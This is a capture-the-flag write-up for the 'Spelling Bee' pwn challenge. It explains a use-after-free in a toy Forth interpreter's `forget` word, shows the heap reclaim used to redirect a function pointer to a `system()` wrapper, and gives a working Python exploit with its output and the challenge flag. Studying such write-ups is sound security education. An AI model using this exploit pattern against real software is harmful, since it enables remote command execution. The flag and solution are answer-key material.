# Spelling Bee

**Category:** Pwn

## Description

> I heard computers like stacks, so I went forth and made a few. It's lacking a few words, maybe you could implement them for me?
>
> `ncat --ssl spelling-bee.opus4-7.b01le.rs 8443`

## Overview

Spelling Bee is a pwn challenge built around a minimal Forth interpreter written in C. The interpreter lets users define new "words" (functions) with `:` / `;` and delete them with `forget`. On startup, it prints the address of an internal `dosys()` function that wraps `system()`, giving a free PIE leak.

The core vulnerability is a **use-after-free / dangling reference**: when `forget` frees a word, any compiled word that still holds a pointer to the freed `word_t` is not updated. By reclaiming the freed heap memory with carefully crafted new words, we can hijack the stale object's `code` function pointer to point to `dosys()` and its `param` to a shell command string, achieving arbitrary command execution.

## Technical details

### Binary mitigations

| Mitigation | Status |
|---|---|
| PIE | Enabled |
| NX | Enabled |
| RELRO | Partial |
| Canary | None |

### Key data structures

The interpreter's word object (`word_t`) is 40 bytes:

```c
typedef struct word {
  long flags;           // offset 0x00
  long length;          // offset 0x08
  long referenced_by;   // offset 0x10
  void (*code)(void *); // offset 0x18
  void *param;          // offset 0x20
} word_t;
```

When a compiled word is executed, the interpreter dispatches via:

```c
(*next)->code((*next)->param);
```

So controlling both `code` and `param` of a `word_t` gives arbitrary function call with a controlled argument.

### The free PIE leak

On startup the binary prints `dosys`'s address directly:

```c
printf("...%p\n", dosys);
```

`dosys` is at offset `0x146b` in the binary, so `pie_base = leak - 0x146b`. Since `dosys` itself calls `system()`, we only need this one address — no libc leak or ROP chain required.

### The vulnerability

`delete_word()` frees the `word_t` (and its `param` if heap-allocated) but **never invalidates references** from other compiled words:

```c
bool delete_word(dict_t **dict, char *name) {
    ...
    word_t *w = cur->word;
    if (w->flags & WF_MALLOC_PARAM)
        free(w->param);
    free(w);          // freed, but other words still hold pointers to w
    ...
}
```

The `referenced_by` counter is incremented during compilation but never checked during deletion. This creates a classic dangling-pointer scenario.

### Exploitation strategy

The exploit uses a **two-stage heap reclaim** on the freed `word_t`:

1. **Create inner word `G` (long name, 30 chars)** — defines a compiled word. Its `word_t` is a 0x30-class malloc chunk, and the `compile_name` allocation (`malloc(strlen("GGG...") + 1)`) falls into a ~0x28 chunk.

2. **Create caller word `F`** — `F`'s compiled body contains a pointer to `G`'s `word_t`.

3. **`forget G`** — frees `G`'s `word_t` and its `param` (the compiled definition array). `F` now holds a dangling pointer to the freed `word_t`.

4. **Reclaim `param` with a command string** — create a new compiled word with a 127-byte name like `cat${IFS}flag*;cat${IFS}/flag*;#AAA...`. The `malloc(128)` for this name reclaims the freed `param` region. The stale `param` pointer in the freed `word_t` now points to our command string.

5. **Reclaim `word_t` with a fake object** — create another compiled word whose name is crafted as:
   ```
   "J" * 24 + p64(dosys_addr)[:6]
   ```
   The `malloc(31)` for this 30-byte name reclaims the freed `word_t` chunk. The first 24 bytes of filler land on `flags`, `length`, and `referenced_by`, while the next 6 bytes overwrite the low bytes of `code` with the address of `dosys`. (On x86-64 with PIE, the upper 2 bytes of user-space addresses are zero, so writing only 6 bytes is sufficient.)

6. **Trigger: call `F`** — the interpreter follows `F`'s stale pointer to the reclaimed `word_t`, dispatching `dosys(param)` → `system("cat${IFS}flag*;...")`.

### Reliability note

The 6 low bytes of `dosys`'s address are embedded directly into a Forth token. If any of those bytes happen to be whitespace (`0x20`, `0x0a`, `0x09`, etc.), the parser's `%127s` will truncate the token and the payload breaks. The exploit retries up to 15 times on remote, since ASLR randomizes the address each connection.

## Proof-of-Concept

```python
#!/usr/bin/env python3
import os, socket, ssl, struct, subprocess, sys, time

CHALL_DIR = "dist/spelling-bee"
BIN_PATH = f"{CHALL_DIR}/chall"
HOST = "spelling-bee.opus4-7.b01le.rs"
PORT = 8443
DOSYS_OFF = 0x146B
BAD_TOKEN_BYTES = set(b" \t\n\r\v\f")

def build_payload(dosys_addr, command):
    low6 = struct.pack("<Q", dosys_addr)[:6]
    if any(b in BAD_TOKEN_BYTES for b in low6):
        raise ValueError(f"dosys low bytes contain whitespace: {low6!r}")

    inner_name = b"G" * 30
    caller_name = b"F"
    cmd_name = command + b"A" * (127 - len(command))
    fake_name = b"J" * 24 + low6

    seq = [
        b":", inner_name, b"1", b";",    # define G (will be freed)
        b":", caller_name, inner_name, b";",  # define F (holds ref to G)
        b"forget", inner_name,            # free G -> F has dangling ptr
        b":", cmd_name, b";",             # reclaim param with cmd string
        b":", fake_name, b";",            # reclaim word_t, overwrite code
        caller_name,                      # trigger: dosys(command)
    ]
    return b" ".join(seq) + b" "

def exploit_remote():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for attempt in range(15):
        try:
            sock = socket.create_connection((HOST, PORT), timeout=10)
            sock = ctx.wrap_socket(sock, server_hostname=HOST)
            f = sock.makefile("rwb", buffering=0)

            f.readline(); f.readline()
            leak = int(f.readline().strip(), 16)
            print(f"[*] attempt {attempt+1}: dosys @ {hex(leak)}")

            command = b"cat${IFS}flag*;cat${IFS}/flag*;#"
            payload = build_payload(leak, command)
            f.write(payload); f.flush()

            sock.settimeout(2.0)
            out = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    out += chunk
                except (socket.timeout, TimeoutError): break

            if b"bctf{" in out:
                print(out.decode(errors="replace"))
                return True
        except ValueError as e:
            print(f"[*] {e}, retrying...")
        except Exception as e:
            print(f"[!] {e}")
        finally:
            sock.close()
    return False

exploit_remote()
```

Running:

```
$ python3 exploit.py REMOTE
[*] attempt 1: dosys @ 0x57c05c60046b
[*] dosys low bytes contain whitespace, retrying...
[*] attempt 2: dosys @ 0x5a3e1f72146b
bctf{1_h473_f0r63771n6_w0rd5_j5475v25fwpck}
```

## P/S

**Flag:** `bctf{1_h473_f0r63771n6_w0rd5_j5475v25fwpck}`

Key takeaways:

- In custom VM/interpreter challenges, `delete`/`forget`/`undefine` operations are prime targets for dangling reference bugs — the object graph often isn't properly invalidated.
- When the binary already provides a `system()` wrapper and leaks its address, there's no need for libc leaks, ROP, or GOT overwrites. The shortest path is always best.
- The two-stage reclaim pattern (one allocation for the argument, one for the function pointer) is a clean and reusable technique for exploiting interpreter-object UAFs.
